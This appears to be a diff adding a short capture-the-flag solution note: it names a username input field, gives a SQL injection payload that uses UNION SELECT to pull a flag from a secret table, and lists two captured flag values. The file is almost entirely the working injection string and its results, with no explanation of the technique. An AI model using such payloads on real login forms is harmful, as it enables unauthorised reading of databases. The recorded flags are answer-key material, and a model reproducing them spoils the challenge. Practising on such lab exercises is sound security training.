@@ -1,0 +1,4 @@
+Input field : username
+payload : "' and 0 UNION SELECT flag FROM my_secret_table -- "
+flag 1 : FLAG-a1e8c4268f2f673b5df74c953c16969d
+flag 2 : FLAG-9c4e69e4cfd239d4e16ba0c189f8d643
